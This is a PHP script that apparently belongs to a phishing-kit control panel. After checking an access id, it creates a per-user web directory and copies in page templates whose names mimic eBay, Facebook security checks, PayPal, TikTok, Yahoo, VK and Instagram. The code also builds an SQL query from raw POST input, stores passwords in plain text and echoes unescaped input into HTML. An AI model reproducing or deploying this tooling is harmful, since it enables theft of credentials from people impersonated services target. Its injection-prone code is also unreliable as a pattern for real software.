<?php 
include("config.php");
function copy_check($source,$dist) {
   
$dir = scandir($source);
foreach ($dir as $sru) { 
   @mkdir("$dist/$sru");
   



}//end foreach

}//end fun

//ramdom string fucn for user 
 function randomstring()
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randstring = '';
        for ($i = 0; $i < 10; $i++) {
            $randstring = $characters[rand(0, strlen($characters))];
        }
        return $randstring;
    } 


//check id and create



  $id = $_POST['id'];
  include('auth.php');
  if ($id == $auth) {
       
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $path = "/opt/lampp/htdocs";
        $exist_us = scandir($path);
        foreach ($exist_us as $exit) {
           if ($exit == $user ) { 
            $rn = randomstring();
            $user .= $rn;} // if exit == use end 
        } //froeach end 
      mkdir($user);
      include('copy.php');
      $source = "/opt/lampp/htdocs/conf";
      $dist = "/opt/lampp/htdocs/$user";
      copy_check($source,$dist); 
    
//save password in data base
      $sql = "INSERT INTO `ser_ser` (`usr`, `pa_pa`, `id`, `encryption`) VALUES ('$user', '$pass', NULL, '$user');";
       mysqli_query($conn,$sql); ?>
<h1> account was created </h1>
<form action="index.php" method="post">
   <input type="hidden" name="user" value="<?php echo $user; ?>">
   <input type="hidden" name="pass" value="<?php echo $pass; ?>">
   <input type="hidden" name="id" value="<?php echo $id; ?>">
   <input type="submit" value="go to dashboard">
</form>
<?php
  copy_all("$source/ebay","$dist/ebay");
  copy_all("$source/facebook_desktop_and_mobile_auto_redirect","$dist/facebook_desktop_and_mobile_auto_redirect");
  copy_all("$source/fb_advanced","$dist/fb_advanced");
  copy_all("$source/fb_messenger","$dist/fb_messenger");
  copy_all("$source/fb_security_virify","$dist/fb_security_virify");
  copy_all("$source/ig_followers","$dist/ig_followers");
  copy_all("$source/paypal","$dist/paypal");
  copy_all("$source/tiktok","$dist/tiktok");
  copy_all("$source/yahoo","$dist/yahoo");
  copy_all("$source/vk","$dist/vk");
 
      
 //chdir foreach end   



      ?> 

   
   
      

<?php  } // if id = use end 

else { //id invalid do something 
   echo "invalid access id";
      }
?>
